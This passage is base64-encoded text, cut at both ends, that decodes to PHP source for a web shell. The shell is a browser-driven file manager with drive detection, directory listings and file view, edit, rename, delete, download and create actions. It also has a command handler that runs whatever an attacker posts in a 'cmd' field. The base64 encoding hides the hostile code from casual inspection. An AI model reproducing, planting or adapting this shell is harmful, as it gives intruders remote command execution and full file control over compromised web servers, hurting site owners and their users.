JGxldHRlcnMgPSAiIjsKCSR2ID0gZXhwbG9kZSgiXFwiLCBwYXRoKCkpOwoJJHYgPSAkdlswXTsKCSBmb3JlYWNoKHJhbmdlKCJBIiwgIloiKSBhcyAkbGV0dGVyKSB7CgkgIAkkYm9vbCA9ICRpc2Rpc2tldHRlID0gaW5fYXJyYXkoJGxldHRlciwgYXJyYXkoIkEiKSk7CgkgIAlpZighJGJvb2wpICRib29sID0gaXNfZGlyKCIkbGV0dGVyOlxcIik7CgkgIAlpZigkYm9vbCkgewoJICAgCQkkbGV0dGVycyAuPSAiWyA8YSBocmVmPSc/ZGlyPSRsZXR0ZXI6XFwnIi4oJGlzZGlza2V0dGU/IiBvbmNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ01ha2Ugc3VyZSB0aGF0IHRoZSBkaXNrZXR0ZSBpcyBpbnNlcnRlZCBwcm9wZXJseSwgb3RoZXJ3aXNlIGFuIGVycm9yIG1heSBvY2N1ci4nKVwiIjoiIikuIj4iOwoJICAgCQlpZigkbGV0dGVyLiI6IiAhPSAkdikgewoJICAgCQkJJGxldHRlcnMgLj0gJGxldHRlcjsKCSAgIAkJfQoJICAgCQllbHNlIHsKCSAgIAkJCSRsZXR0ZXJzIC49IGNvbG9yKDEsIDIsICRsZXR0ZXIpOwoJICAgCQl9CgkgICAJCSRsZXR0ZXJzIC49ICI8L2E+IF0iOwoJICAJfQoJfQoJaWYoIWVtcHR5KCRsZXR0ZXJzKSkgewoJCXByaW50ICJEZXRlY3RlZCBEcml2ZXMgJGxldHRlcnM8YnI+IjsKCX0KfQoKZnVuY3Rpb24gd3JpdGVhYmxlKCRwYXRoLCAkcGVybXMpIHsKCXJldHVybiAoIWlzX3dyaXRhYmxlKCRwYXRoKSkgPyBjb2xvcigxLCAxLCAkcGVybXMpIDogY29sb3IoMSwgMiwgJHBlcm1zKTsKfQoKZnVuY3Rpb24gaGRkc2l6ZSgkc2l6ZSkgewoJaWYoJHNpemUgPj0gMTA3Mzc0MTgyNCkKCQlyZXR1cm4gc3ByaW50ZignJTEuMmYnLCRzaXplIC8gMTA3Mzc0MTgyNCApLicgR0InOwoJZWxzZWlmKCRzaXplID49IDEwNDg1NzYpCgkJcmV0dXJuIHNwcmludGYoJyUxLjJmJywkc2l6ZSAvIDEwNDg1NzYgKSAuJyBNQic7CgllbHNlaWYoJHNpemUgPj0gMTAyNCkKCQlyZXR1cm4gc3ByaW50ZignJTEuMmYnLCRzaXplIC8gMTAyNCApIC4nIEtCJzsKCWVsc2UKCQlyZXR1cm4gJHNpemUgLicgQic7Cn0KCmZ1bmN0aW9uIGhkZCgpIHsKICBpZihPUygpID09PSAiV2luZG93cyIpewogICAgJGhkZFsnc2l6ZSddID0gaGRkc2l6ZShkaXNrX3RvdGFsX3NwYWNlKGRpc2soKSkpOwogICAgJGhkZFsnZnJlZSddID0gaGRkc2l6ZShkaXNrX2ZyZWVfc3BhY2UoZGlzaygpKSk7CiAgICAkaGRkWyd1c2VkJ10gPSAkaGRkWydzaXplJ10gLSAkaGRkWydmcmVlJ107CiAgfWVsc2V7CiAgCSRoZGRbJ3NpemUnXSA9IGhkZHNpemUoZGlza190b3RhbF9zcGFjZSgiLyIpKTsKICAJJGhkZFsnZnJlZSddID0gaGRkc2l6ZShkaXNrX2ZyZWVfc3BhY2UoIi8iKSk7CiAgCSRoZGRbJ3VzZWQnXSA9ICRoZGRbJ3NpemUnXSAtICRoZGRbJ2ZyZWUnXTsKICB9CglyZXR1cm4gKG9iamVjdCkgJGhkZDsKfQoKZnVuY3Rpb24gaW5kZXhpbmcoKXsKICBpZighaXNfZGlyKHBhdGgoKSkpIGRpZShjb2xvcigxLCAxLCAiRGlyZWN0b3J5ICciLnBhdGgoKS4iJyBpcyBub3QgZXhpc3RzLiIpKTsKCWlmKCFpc19yZWFkYWJsZShwYXRoKCkpKSBkaWUoY29sb3IoMSwgMSwgIkRpcmVjdG9yeSAnIi5wYXRoKCkuIicgbm90IHJlYWRhYmxlLiIpKTsKCiAgcHJpbnQgJzx0YWJsZSB3aWR0aD0iMTAwJSIgY2xhc3M9InRhYmxlX2hvbWUgc3RyaXBlZCIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMyIgY2VsbHNwYWNpbmc9IjEiIGFsaWduPSJjZW50ZXIiPgogICAgICA8dGhlYWQ+CgkJICAgPHRyPgoJCSAgIDx0aCBjbGFzcz0idGhfaG9tZSI+PGNlbnRlcj5OYW1lPC9jZW50ZXI+PC90aD4KCQkgICA8dGggY2xhc3M9InRoX2hvbWUiPjxjZW50ZXI+VHlwZTwvY2VudGVyPjwvdGg+CgkJICAgPHRoIGNsYXNzPSJ0aF9ob21lIj48Y2VudGVyPlNpemU8L2NlbnRlcj48L3RoPgoJCSAgIDx0aCBjbGFzcz0idGhfaG9tZSI+PGNlbnRlcj5MYXN0IE1vZGlmaWVkPC9jZW50ZXI+PC90aD4KCQkgICA8dGggY2xhc3M9InRoX2hvbWUiPjxjZW50ZXI+T3duZXIvR3JvdXA8L2NlbnRlcj48L3RoPgoJCSAgIDx0aCBjbGFzcz0idGhfaG9tZSI+PGNlbnRlcj5QZXJtaXNzaW9uPC9jZW50ZXI+PC90aD4KCQkgICA8dGggY2xhc3M9InRoX2hvbWUiPjxjZW50ZXI+QWN0aW9uPC9jZW50ZXI+PC90aD4KCQkgICA8L3RyPgogICAgICA8L3RoZWFkPic7CgogIGlmKGZ1bmN0aW9uX2V4aXN0cygnb3BlbmRpcicpKSB7CiAgCQlpZigkb3BlbmRpciA9IG9wZW5kaXIocGF0aCgpKSkgewogIAkJCXdoaWxlKCgkcmVhZGRpciA9IHJlYWRkaXIoJG9wZW5kaXIpKSAhPT0gZmFsc2UpIHsKICAJCQkJJGRpcltdID0gJHJlYWRkaXI7CiAgCQkJfQogIAkJCWNsb3NlZGlyKCRvcGVuZGlyKTsKICAJCX0KICAJCXNvcnQoJGRpcik7CiAgCX0gZWxzZSB7CiAgCQkkZGlyID0gc2NhbmRpcihwYXRoKCkpOwogIAl9CgogIGZvcmVhY2goJGRpciBhcyAkZm9sZGVyKSB7CgkJJGRpcmluZm9bJ3BhdGgnXSA9IHBhdGgoKS5ESVJFQ1RPUllfU0VQQVJBVE9SLiRmb2xkZXI7CgkJaWYoIWlzX2RpcigkZGlyaW5mb1sncGF0aCddKSkgY29udGludWU7CgkJJGRpcmluZm9bJ3R5cGUnXSAgPSBmaWxldHlwZSgkZGlyaW5mb1sncGF0aCddKTsKCQkkZGlyaW5mb1sndGltZSddICA9IGRhdGUoIkYgZCBZIGc6aTpzIiwgZmlsZW10aW1lKCRkaXJpbmZvWydwYXRoJ10pKTsKCQkkZGlyaW5mb1snc2l6ZSddICA9ICItIjsKCQkkZGlyaW5mb1sncGVybXMnXSA9IHdyaXRlYWJsZSgkZGlyaW5mb1sncGF0aCddLCBwZXJtcygkZGlyaW5mb1sncGF0aCddKSk7CgkJJGRpcmluZm9bJ2xpbmsnXSAgPSAoJGZvbGRlciA9PT0gIi4uIiA/ICI8YSBocmVmPSc/ZGlyPSIuZGlybmFtZShwYXRoKCkpLiInPiRmb2xkZXI8L2E+IiA6ICgkZm9sZGVyID09PSAiLiIgPyAgIjxhIGhyZWY9Jz9kaXI9Ii5wYXRoKCkuIic+JGZvbGRlcjwvYT4iIDogIjxhIGhyZWY9Jz9kaXI9Ii4kZGlyaW5mb1sncGF0aCddLiInPiRmb2xkZXI8L2E+IikpOwoJCSRkaXJpbmZvWydhY3Rpb24nXT0gKCRmb2xkZXIgPT09ICcuJyB8fCAkZm9sZGVyID09PSAnLi4nKSA/ICItIiA6ICI8YSBocmVmPSc/YWN0PXJlbmFtZV9mb2xkZXImZGlyPSIuJGRpcmluZm9bJ3BhdGgnXS4iJz48aSBjbGFzcz0nc21hbGwgbWF0ZXJpYWwtaWNvbnMnPmNsYXNzPC9pPjwvYT4gIDxhIGhyZWY9Jz9hY3Q9ZGVsZXRlX2ZvbGRlciZkaXI9Ii4kZGlyaW5mb1sncGF0aCddLiInPjxpIGNsYXNzPSdzbWFsbCBtYXRlcmlhbC1pY29ucyc+ZGVsZXRlPC9pPjwvYT4iOwoJCWlmKGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0cHd1aWQnKSkgewoJCQkkZGlyaW5mb1snb3duZXInXSA9IChvYmplY3QpIEBwb3NpeF9nZXRwd3VpZChmaWxlb3duZXIoJGRpcmluZm9bJ3BhdGgnXSkpOwoJCQkkZGlyaW5mb1snb3duZXInXSA9ICRkaXJpbmZvWydvd25lciddLT5uYW1lOwoJCX0gZWxzZSB7CgkJCSRkaXJpbmZvWydvd25lciddID0gZmlsZW93bmVyKCRkaXJpbmZvWydwYXRoJ10pOwoJCX0KCQlpZihmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGdyZ2lkJykpIHsKCQkJJGRpcmluZm9bJ2dyb3VwJ10gPSAob2JqZWN0KSBAcG9zaXhfZ2V0Z3JnaWQoZmlsZWdyb3VwKCRkaXJpbmZvWydwYXRoJ10pKTsKCQkJJGRpcmluZm9bJ2dyb3VwJ10gPSAkZGlyaW5mb1snZ3JvdXAnXS0+bmFtZTsKCQl9IGVsc2UgewoJCQkkZGlyaW5mb1snZ3JvdXAnXSA9IGZpbGVncm91cCgkZGlyaW5mb1sncGF0aCddKTsKCQl9CgkJcHJpbnQgIjx0cj4iOwoJCXByaW50ICI8dGQgY2xhc3M9J3RkX2hvbWUnPjxpIGNsYXNzPSd0aW55IG1hdGVyaWFsLWljb25zIGFtYmVyLXRleHQnPnBlcm1fbWVkaWE8L2k+ICIuJGRpcmluZm9bJ2xpbmsnXS4iPC90ZD4iOwoJCXByaW50ICI8dGQgY2xhc3M9J3RkX2hvbWUnIHN0eWxlPSd0ZXh0LWFsaWduOiBjZW50ZXI7Jz4iLiRkaXJpbmZvWyd0eXBlJ10uIjwvdGQ+IjsKCQlwcmludCAiPHRkIGNsYXNzPSd0ZF9ob21lJyBzdHlsZT0ndGV4dC1hbGlnbjogY2VudGVyOyc+Ii4kZGlyaW5mb1snc2l6ZSddLiI8L3RkPiI7CgkJcHJpbnQgIjx0ZCBjbGFzcz0ndGRfaG9tZScgc3R5bGU9J3RleHQtYWxpZ246IGNlbnRlcjsnPiIuJGRpcmluZm9bJ3RpbWUnXS4iPC90ZD4iOwoJCXByaW50ICI8dGQgY2xhc3M9J3RkX2hvbWUnIHN0eWxlPSd0ZXh0LWFsaWduOiBjZW50ZXI7Jz4iLiRkaXJpbmZvWydvd25lciddLkRJUkVDVE9SWV9TRVBBUkFUT1IuJGRpcmluZm9bJ2dyb3VwJ10uIjwvdGQ+IjsKCQlwcmludCAiPHRkIGNsYXNzPSd0ZF9ob21lJyBzdHlsZT0ndGV4dC1hbGlnbjogY2VudGVyOyc+Ii4kZGlyaW5mb1sncGVybXMnXS4iPC90ZD4iOwoJCXByaW50ICI8dGQgY2xhc3M9J3RkX2hvbWUnIHN0eWxlPSdwYWRkaW5nLWxlZnQ6IDE1cHg7Jz48Y2VudGVyPiIuJGRpcmluZm9bJ2FjdGlvbiddLiI8L2NlbnRlcj48L3RkPiI7CgkJcHJpbnQgIjwvdHI+IjsKCX0KCWZvcmVhY2goJGRpciBhcyAkZmlsZXMpIHsKCQkkZmlsZWluZm9bJ3BhdGgnXSA9IHBhdGgoKS5ESVJFQ1RPUllfU0VQQVJBVE9SLiRmaWxlczsKCQlpZighaXNfZmlsZSgkZmlsZWluZm9bJ3BhdGgnXSkpIGNvbnRpbnVlOwoJCSRmaWxlaW5mb1sndHlwZSddID0gZmlsZXR5cGUoJGZpbGVpbmZvWydwYXRoJ10pOwoJCSRmaWxlaW5mb1sndGltZSddID0gZGF0ZSgiRiBkIFkgZzppOnMiLCBmaWxlbXRpbWUoJGZpbGVpbmZvWydwYXRoJ10pKTsKCQkkZmlsZWluZm9bJ3NpemUnXSA9IGZpbGVzaXplKCRmaWxlaW5mb1sncGF0aCddKS8xMDI0OwoJCSRmaWxlaW5mb1snc2l6ZSddID0gcm91bmQoJGZpbGVpbmZvWydzaXplJ10sMyk7CgkJJGZpbGVpbmZvWydzaXplJ10gPSAoJGZpbGVpbmZvWydzaXplJ10gPiAxMDI0KSA/IHJvdW5kKCRmaWxlaW5mb1snc2l6ZSddLzEwMjQsMikuICJNQiIgOiAkZmlsZWluZm9bJ3NpemUnXS4gIktCIjsKCQkkZmlsZWluZm9bJ3Blcm1zJ109IHdyaXRlYWJsZSgkZmlsZWluZm9bJ3BhdGgnXSwgcGVybXMoJGZpbGVpbmZvWydwYXRoJ10pKTsKCQlpZihmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldHB3dWlkJykpIHsKCQkJJGZpbGVpbmZvWydvd25lciddID0gIChvYmplY3QpIEBwb3NpeF9nZXRwd3VpZChmaWxlb3duZXIoJGZpbGVpbmZvWydwYXRoJ10pKTsKCQkJJGZpbGVpbmZvWydvd25lciddID0gJGZpbGVpbmZvWydvd25lciddLT5uYW1lOwoJCX0gZWxzZSB7CgkJCSRmaWxlaW5mb1snb3duZXInXSA9IGZpbGVvd25lcigkZmlsZWluZm9bJ3BhdGgnXSk7CgkJfQoJCWlmKGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0Z3JnaWQnKSkgewoJCQkkZmlsZWluZm9bJ2dyb3VwJ10gPSAob2JqZWN0KSBAcG9zaXhfZ2V0Z3JnaWQoZmlsZWdyb3VwKCRmaWxlaW5mb1sncGF0aCddKSk7CgkJCSRmaWxlaW5mb1snZ3JvdXAnXSA9ICRmaWxlaW5mb1snZ3JvdXAnXS0+bmFtZTsKCQl9IGVsc2UgewoJCQkkZmlsZWluZm9bJ2dyb3VwJ10gPSBmaWxlZ3JvdXAoJGZpbGVpbmZvWydwYXRoJ10pOwoJCX0KCQlwcmludCAiPHRyPiI7CgkJcHJpbnQgIjx0ZCBjbGFzcz0ndGRfaG9tZSc+PGkgY2xhc3M9J3RpbnkgbWF0ZXJpYWwtaWNvbnMgcmVkLXRleHQnPmRlc2NyaXB0aW9uPC9pPiA8YSBocmVmPSc/YWN0PXZpZXcmZGlyPSIucGF0aCgpLiImZmlsZT0iLiRmaWxlaW5mb1sncGF0aCddLiInPiRmaWxlczwvYT48L3RkPiI7CgkJcHJpbnQgIjx0ZCBjbGFzcz0ndGRfaG9tZScgc3R5bGU9J3RleHQtYWxpZ246IGNlbnRlcjsnPiIuJGZpbGVpbmZvWyd0eXBlJ10uIjwvdGQ+IjsKCQlwcmludCAiPHRkIGNsYXNzPSd0ZF9ob21lJyBzdHlsZT0ndGV4dC1hbGlnbjogY2VudGVyOyc+Ii4kZmlsZWluZm9bJ3NpemUnXS4iPC90ZD4iOwoJCXByaW50ICI8dGQgY2xhc3M9J3RkX2hvbWUnIHN0eWxlPSd0ZXh0LWFsaWduOiBjZW50ZXI7Jz4iLiRmaWxlaW5mb1sndGltZSddLiI8L3RkPiI7CgkJcHJpbnQgIjx0ZCBjbGFzcz0ndGRfaG9tZScgc3R5bGU9J3RleHQtYWxpZ246IGNlbnRlcjsnPiIuJGZpbGVpbmZvWydvd25lciddLkRJUkVDVE9SWV9TRVBBUkFUT1IuJGZpbGVpbmZvWydncm91cCddLiI8L3RkPiI7CgkJcHJpbnQgIjx0ZCBjbGFzcz0ndGRfaG9tZScgc3R5bGU9J3RleHQtYWxpZ246IGNlbnRlcjsnPiIuJGZpbGVpbmZvWydwZXJtcyddLiI8L3RkPiI7CgkJcHJpbnQgIjx0ZCBjbGFzcz0ndGRfaG9tZScgc3R5bGU9J3BhZGRpbmctbGVmdDogMTVweDsnPjxjZW50ZXI+PGEgaHJlZj0nP2FjdD1lZGl0JmRpcj0iLnBhdGgoKS4iJmZpbGU9Ii4kZmlsZWluZm9bJ3BhdGgnXS4iJz48aSBjbGFzcz0nc21hbGwgbWF0ZXJpYWwtaWNvbnMnPm1vZGVfZWRpdDwvaT48L2E+ICA8YSBocmVmPSc/YWN0PXJlbmFtZSZkaXI9Ii5wYXRoKCkuIiZmaWxlPSIuJGZpbGVpbmZvWydwYXRoJ10uIic+PGkgY2xhc3M9J3NtYWxsIG1hdGVyaWFsLWljb25zJz5jbGFzczwvaT48L2E+ICA8YSBocmVmPSc/YWN0PWRlbGV0ZSZkaXI9Ii5wYXRoKCkuIiZmaWxlPSIuJGZpbGVpbmZvWydwYXRoJ10uIic+PGkgY2xhc3M9J3NtYWxsIG1hdGVyaWFsLWljb25zJz5kZWxldGU8L2k+PC9hPiAgPGEgaHJlZj0nP2FjdD1kb3dubG9hZCZkaXI9Ii5wYXRoKCkuIiZmaWxlPSIuJGZpbGVpbmZvWydwYXRoJ10uIic+PGkgY2xhc3M9J3NtYWxsIG1hdGVyaWFsLWljb25zJz5wbGF5X2Zvcl93b3JrPC9pPjwvYT48L2NlbnRlcj48L3RkPiI7CgkJcHJpbnQgIjwvdHI+IjsKCX0KCnByaW50ICc8L3RhYmxlPic7Cn0KCiAgICBmdW5jdGlvbiBjb250ZW50KCl7CiAgICAgIGlmKGlzc2V0KCRfR0VUWydkbyddKSkgewogICAgCQlpZigkX0dFVFsnZG8nXSA9PT0gImNtZCIpIHsKICAgICAgICAgIGlmKGlzc2V0KCRfUE9TVFsnY21kJ10pKSB7CiAgICAgICAgICAgIHByaW50ICI8cHJlPiIuZXhlKCRfUE9TVFsnY21kJ10pLiI8L3ByZT4iOwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgfWVsc2VpZihpc3NldCgkX0dFVFsnYWN0J10pKXsKICAgICAgICBpZigkX0dFVFsnYWN0J10gPT09ICduZXdmaWxlJykgewogICAgCQkJaWYoJF9QT1NUWydzYXZlJ10pIHsKICAgIAkJCQkkZmlsZW5hbWUgPSBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnZmlsZW5hbWUnXSk7CiAgICAJCQkJJGZvcGVuICAgID0gZm9wZW4oJGZpbGVuYW1lLCAidysiKTsKICAgIAkJCQlpZigkZm9wZW4pIHsKICAgICAgICAgICAgICBmd3JpdGUoJGZvcGVuLCAkX1BPU1RbJ2NvbnRlbnQnXSk7CiAgICAJCQkJCSRhY3QgPSBjb2xvcigxLCAyLCAiU3VjY2VzcyEiKSAuICIgLSA8YSBocmVmPSc/ZGlyPSIgLiBwYXRoKCkgLiAiJz5CYWNrPC9hPiI7CiAgICAJCQkJfQogICAgCQkJCWVsc2UgewogICAgCQkJCQkkYWN0ID0gY29sb3IoMSwgMSwgIlBlcm1pc3Npb24gRGVuaWVkISIpOwogICAgCQkJCX0KICAgIAkJCX0KICAgIAkJCXByaW50ICRhY3Q7CiAgICAgICAgICBpZighJF9QT1NUWydzYXZlJ10pewogICAgICAJCQlwcmludCAiPGZvcm0gbWV0aG9kPSdwb3N0Jz4KICAgICAgCQkJPGI+RmlsZW5hbWU6PC9iPiA8aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0nZmlsZW5hbWUnIHZhbHVlPSciLnBhdGgoKS4iL25ld2ZpbGUucGhwJyBzdHlsZT0nd2lkdGg6IDQ1MHB4OycgaGVpZ2h0PScxMCc+PGJyPgogICAgICAgICAgICA8Yj5Db250ZW50OjwvYj4KICAgICAgICAgICAgPHRleHRhcmVhIGlkPSd0ZXh0YXJlYTEnIGNsYXNzPSdtYXRlcmlhbGl6ZS10ZXh0YXJlYScgbmFtZT0nY29udGVudCc+PC90ZXh0YXJlYT4KICAgICAgCQkJPGlucHV0IGNsYXNzPSdidG4nIHR5cGU9J3N1Ym1pdCcgY2xhc3M9J2lucHV0JyBuYW1lPSdzYXZlJyB2YWx1ZT0nU1VCTUlUJz4KICAgICAgCQkJPC9mb3JtPiI7CiAgICAgICAgICB9CiAgICAJCX0KICAgICAgICBlbHNlaWYoJF9HRVRbJ2FjdCddID09PSAnbmV3Zm9sZGVyJykgewogICAgCQkJaWYoJF9QT1NUWydzYXZlJ10pIHsKICAgIAkJCQkkZm9sZGVybmFtZSA9IHBhdGgoKS4nLycuaHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ2ZvbGRlcm5hbWUnXSk7CiAgICAJCQkJaWYoIUBta2RpcigkZm9sZGVybmFtZSkpIHsKICAgIAkJCQkJJGFjdCA9IGNvbG9yKDEsIDEsICJQZXJtaXNzaW9uIERlbmllZCEiKTsKICAgIAkJCQl9CiAgICAJCQkJZWxzZSB7CiAgICAJCQkJCSRhY3QgPSAiPHNjcmlwdD53aW5kb3cubG9jYXRpb249Jz9kaXI9Ii5wYXRoKCkuIic7PC9zY3JpcHQ+IjsKICAgIAkJCQl9CiAgICAJCQl9CiAgICAJCQlwcmludCAkYWN0OwogICAgCQkJcHJpbnQgIjxmb3JtIG1ldGhvZD0ncG9zdCc+CiAgICAJCQlGb2xkZXIgTmFtZTogPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J2ZvbGRlcm5hbWUnIHN0eWxlPSd3aWR0aDogNDUwcHg7JyBoZWlnaHQ9JzEwJz4KICAgIAkJCTxpbnB1dCB0eXBlPSdzdWJtaXQnIGNsYXNzPSdpbnB1dCBidG4nIG5hbWU9J3NhdmUnIHZhbHVlPSdTVUJNSVQnPgogICAgCQkJPC9mb3JtPiI7CiAgICAgICAgfWVsc2VpZigkX0dFVFsnYWN0J10gPT09ICdlZGl0JykgewogICAgCQkJaWYoJF9QT1NUWydzYXZlJ10pIHsKICAgIAkJCQkkc2F2ZSA9IGZpbGVfcHV0X2NvbnRlbnRzKCRfR0VUWydmaWxlJ10sICRfUE9TVFsnc3JjJ10pOwogICAgCQkJCWlmKCRzYXZlKSB7CiAgICAJCQkJCSRhY3QgPSBjb2xvcigxLCAyLCAiRmlsZSBTYXZlZCEiKTsKICAgIAkJCQl9CiAgICAJCQkJZWxzZSB7CiAgICAJCQkJCSRhY3QgPSBjb2xvcigxLCAxLCAiUGVybWlzc2lvbiBEZW5pZWQhIik7CiAgICAJCQkJfQogICAgCQkJCXByaW50ICIkYWN0PGJyPiI7CiAgICAJCQl9CiAgICAJCQlwcmludCAiRmlsZW5hbWU6ICIuY29sb3IoMSwgMiwgYmFzZW5hbWUoJF9HRVRbJ2ZpbGUnXSkpLiIgWyIud3JpdGVhYmxlKCRfR0VUWydmaWxlJ10sIHBlcm1zKCRfR0VUWydmaWxlJ10pKS4iXTxicj4iOwogICAgCQkJcHJpbnQgIlsgPGEgaHJlZj0nP2FjdD12aWV3JmRpcj0iLnBhdGgoKS4iJmZpbGU9Ii4kX0dFVFsnZmlsZSddLiInPnZpZXc8L2E+IF0gWyA8YSBocmVmPSc/YWN0PWVkaXQmZGlyPSIucGF0aCgpLiImZmlsZT0iLiRfR0VUWydmaWxlJ10uIic+PGI+ZWRpdDwvYj48L2E+IF0gWyA8YSBocmVmPSc/YWN0PXJlbmFtZSZkaXI9Ii5wYXRoKCkuIiZmaWxlPSIuJF9HRVRbJ2ZpbGUnXS4iJz5yZW5hbWU8L2E+IF0gWyA8YSBocmVmPSc/YWN0PWRvd25sb2FkJmRpcj0iLnBhdGgoKS4iJmZpbGU9Ii4kX0dFVFsnZmlsZSddLiInPmRvd25sb2FkPC9hPiBdIFsgPGEgaHJlZj0nP2FjdD1kZWxldGUmZGlyPSIucGF0aCgpLiImZmlsZT0iLiRfR0VUWydmaWxlJ10uIic+ZGVsZXRlPC9hPiBdPGJyPiI7CiAgICAJCQlwcmludCAiPGZvcm0gbWV0aG9kPSdwb3N0Jz4KICAgIAkJCTx0ZXh0YXJlYSBuYW1lPSdzcmMnPiIuaHRtbHNwZWNpYWxjaGFycyhAZmlsZV9nZXRfY29udGVudHMoJF9HRVRbJ2ZpbGUnXSkpLiI8L3RleHRhcmVhPjxicj4KICAgIAkJCTxpbnB1dCB0eXBlPSdzdWJtaXQnIGNsYXNzPSdpbnB1dCBidG4nIHZhbHVlPSdTQVZFJyBuYW1lPSdzYXZlJz4KICAgIAkJCTwvZm9ybT4iOwogICAgICAgIH1lbHNlaWYoJF9HRVRbJ2FjdCddID09PSAndmlldycpIHsKICAgIAkJCXByaW50ICJGaWxlbmFtZTogIi5jb2xvcigxLCAyLCBiYXNlbmFtZSgkX0dFVFsnZmlsZSddKSkuIiBbIi53cml0ZWFibGUoJF9HRVRbJ2ZpbGUnXSwgcGVybXMoJF9HRVRbJ2ZpbGUnXSkpLiJdPGJyPiI7CiAgICAJCQlwcmludCAiWyA8YSBocmVmPSc/YWN0PXZpZXcmZGlyPSIucGF0aCgpLiImZmlsZT0iLiRfR0VUWydmaWxlJ10uIic+PGI+dmlldzwvYj48L2E+IF0gWyA8YSBocmVmPSc/YWN0PWVkaXQmZGlyPSIucGF0aCgpLiImZmlsZT0iLiRfR0VUWydmaWxlJ10uIic+ZWRpdDwvYT4gXSBbIDxhIGhyZWY9Jz9hY3Q9cmVuYW1lJmRpcj0iLnBhdGgoKS4iJmZpbGU9Ii4kX0dFVFsnZmlsZSddLiInPnJlbmFtZTwvYT4gXSBbIDxhIGhyZWY9Jz9hY3Q9ZG93bmxvYWQmZGlyPSIucGF0aCgpLiImZmlsZT0iLiRfR0VUWydmaWxlJ10uIic+ZG93bmxvYWQ8L2E+IF0gWyA8YSBocmVmPSc/YWN0PWRlbGV0ZSZkaXI9Ii5wYXRoKCkuIiZmaWxlPSIuJF9HRVRbJ2ZpbGUnXS4iJz5kZWxldGU8L2E+IF08YnI+IjsKICAgIAkJCXByaW50ICI8dGV4dGFyZWEgcmVhZG9ubHk+Ii5odG1sc3BlY2lhbGNoYXJzKEBmaWxlX2dldF9jb250ZW50cygkX0dFVFsnZmlsZSddKSkuIjwvdGV4dGFyZWE+IjsKICAgIAkJfWVsc2VpZigkX0dFVFsnYWN0J10gPT09ICdyZW5hbWUnKSB7CiAgICAJCQlpZigkX1BPU1RbJ3NhdmUnXSkgewogICAgCQkJCSRyZW5hbWUgPSByZW5hbWUoJF9HRVRbJ2ZpbGUnXSwgcGF0aCgpLkRJUkVDVE9SWV9TRVBBUkFUT1IuaHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ2ZpbGVuYW1lJ10pKTsKICAgIAkJCQlpZigkcmVuYW1lKSB7CiAgICAJCQkJCSRhY3QgPSAiPHNjcmlwdD53aW5kb3cubG9jYXRpb249Jz9kaXI9Ii5wYXRoKCkuIic7PC9zY3JpcHQ+IjsKICAgIAkJCQl9CiAgICAJCQkJZWxzZSB7CiAgICAJCQkJCSRhY3QgPSBjb2xvcigxLCAxLCAiUGVybWlzc2lvbiBEZW5pZWQhIik7CiAgICAJCQkJfQogICAgCQkJCXByaW50ICIkYWN0PGJyPiI7CiAgICAJCQl9CiAgICAJCQlwcmludCAiRmlsZW5hbWU6ICIuY29sb3IoMSwgMiwgYmFzZW5hbWUoJF9HRVRbJ2ZpbGUnXSkpLiIgWyIud3JpdGVhYmxlKCRfR0VUWydmaWxlJ10sIHBlcm1zKCRfR0VUWydmaWxlJ10pKS4iXTxicj4iOwogICAgCQkJcHJpbnQgIlsgPGEgaHJlZj0nP2FjdD12aWV3JmRpcj0iLnBhdGgoKS4iJmZpbGU9Ii4kX0dFVFsnZmlsZSddLiInPnZpZXc8L2E+IF0gWyA8YSBocmVmPSc/YWN0PWVkaXQmZGlyPSIucGF0aCgpLiImZmlsZT0iLiRfR0VUWydmaWxlJ10uIic+ZWRpdDwvYT4gXSBbIDxhIGhyZWY9Jz9hY3Q9cmVuYW1lJmRpcj0iLnBhdGgoKS4iJmZpbGU9Ii4kX0dFVFsnZmlsZSddLiInPjxiPnJlbmFtZTwvYj48L2E+IF0gWyA8YSBocmVmPSc/YWN0PWRvd25sb2FkJmRpcj0iLnBhdGgoKS4iJmZpbGU9Ii4kX0dFVFsnZmlsZSddLiInPmRvd25sb2FkPC9hPiBdIFsgPGEgaHJlZj0nP2FjdD1kZWxldGUmZGlyPSIucGF0aCgpLiImZmlsZT0iLiRfR0VUWydmaWxlJ10uIic+ZGVsZXRlPC9hPiBdPGJyPiI7CiAgICAJCQlwcmludCAiPGZvcm0gbWV0aG9kPSdwb3N0Jz4KICAgIAkJCTxpbnB1dCB0eXBlPSd0ZXh0JyB2YWx1ZT0nIi5iYXNlbmFtZSgkX0dFVFsnZmlsZSddKS4iJyBuYW1lPSdmaWxlbmFtZScgc3R5bGU9J3dpZHRoOiA0NTBweDsnIGhlaWdodD0nMTAnPgogICAgCQkJPGlucHV0IHR5cGU9J3N1Ym1pdCcgY2xhc3M9J2lucHV0IGJ0bicgbmFtZT0nc2F2ZScgdmFsdWU9J1JFTkFNRSc+CiAgICAJCQk8L2Zvcm0+IjsKICAgIAkJfWVsc2VpZigkX0dFVFsnYWN0J10gPT09ICdyZW5hbWVfZm9sZGVyJykgewogICAgCQkJaWYoJF9QT1NUWydzYXZlJ10pIHsKICAgIAkJCQkkcmVuYW1lX2ZvbGRlciA9IHJlbmFtZShwYXRoKCksICIiLmRpcm5hbWUocGF0aCgpKS5ESVJFQ1RPUllfU0VQQVJBVE9SLmh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydmb2xkZXJuYW1lJ10pKTsKICAgIAkJCQlpZigkcmVuYW1lX2ZvbGRlcikgewogICAgCQkJCQkkYWN0ID0gIjxzY3JpcHQ+d2luZG93LmxvY2F0aW9uPSc/ZGlyPSIuZGlybmFtZShwYXRoKCkpLiInOzwvc2NyaXB0PiI7CiAgICAJCQkJfQogICAgCQkJCWVsc2UgewogICAgCQkJCQkkYWN0ID0gY29sb3IoMSwgMSwgIlBlcm1pc3Npb24gRGVuaWVkISIpOwogICAgCQkJCX0KICAgIAkJCXByaW50ICIkYWN0PGJyPiI7CiAgICAJCQl9CiAgICAJCQlwcmludCAiPGZvcm0gbWV0aG9kPSdwb3N0Jz4KICAgICAgICAgIDxiPkZvbGRlciBOYW1lO